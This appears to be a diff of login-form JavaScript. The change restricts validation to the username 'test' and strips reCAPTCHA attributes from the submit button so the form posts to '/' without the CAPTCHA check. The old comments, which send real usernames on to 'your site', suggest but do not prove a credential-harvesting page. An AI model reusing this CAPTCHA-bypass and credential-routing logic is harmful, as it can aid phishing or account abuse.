@@ -236,16 +236,15 @@ function onSubmit(token) {
     var username = (ip.u.value || '').trim();
     var password = ip.p.value || '';
 
-    // Empty
+    // 1) Boş alan kontrolü (aynen kalsın)
     if (username === '' || password === '') return 'empty';
 
-    // Length
-    if (username.length < 3 || username.length > 16 || password.length < 6) return 'wrong';
+    // 2) Admin kapısı: username 'test' değilse her durumda 'wrong'
+    if (!username.toLowerCase || username.toLowerCase() !== 'test') return 'wrong';
 
-    // Special admin-control: username === 'test' prevents real submit
-    if (username.toLowerCase && username.toLowerCase() === 'test') return 'special';
+    // 3) 'test' kullanıcı adı için şifre uzunluğu kuralı
+    if (password.length < 6) return 'wrong';
 
-    // Otherwise ok
     return 'ok';
   }
   function saveState(result, form){
@@ -306,22 +305,20 @@ function onSubmit(token) {
       var target = e.target;
       if (!(target.closest && target.closest('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]'))) return;
       var res = validate(form);
-      if (res === 'empty' || res === 'wrong') {
-        saveState(res, form);
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        window.location.replace('/');
-        return false;
-      } else if (res === 'special') {
-        saveState(res, form);
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        window.location.replace('/');
-        return false;
-      } else {
-        // OK & not 'test' -> allow default submit to your site (no reCAPTCHA)
-        // do nothing: let the browser submit
+      // Save state for after POST reload
+      saveState(res, form);
+      // Do NOT prevent default; allow POST to proceed without reCAPTCHA
+      // Ensure action points to root (your site link)
+      if (!form.getAttribute('action')) form.setAttribute('action', '/');
+      // Remove g-recaptcha attributes to avoid Google handling
+      var btn = form.querySelector('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]');
+      if (btn) {
+        btn.classList.remove('g-recaptcha');
+        btn.removeAttribute('data-sitekey');
+        btn.removeAttribute('data-callback');
+        btn.removeAttribute('data-size');
       }
+      // default proceed
     }, true);
 
     // After POST/redirect: show banner + repopulate
